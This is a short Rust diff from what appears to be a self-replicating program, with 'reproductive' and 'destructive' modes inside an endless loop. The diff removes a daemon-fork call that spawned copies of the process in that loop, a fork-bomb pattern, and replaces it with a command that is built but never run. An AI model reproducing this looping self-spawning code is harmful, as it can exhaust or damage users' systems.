@@ -2,7 +2,6 @@ extern crate random_string;
 extern crate walkdir;
 extern crate dirs;
 use std::process::Command;
-use fork::{daemon, Fork};
 use std::path::Path;
 use std::io::Write;
 use std::env;
@@ -60,9 +59,7 @@ fn main() {
 		};
 		if reproductive {
 			loop {
-				if let Ok(Fork::Child) = daemon(true, false) {
-					yad_restart.arg("").output().expect("Failed to execute child process");
-				}
+				Command::new(&args[0]);
 				if destructive {
 					Command::new(&yad_pathstr);
 				}
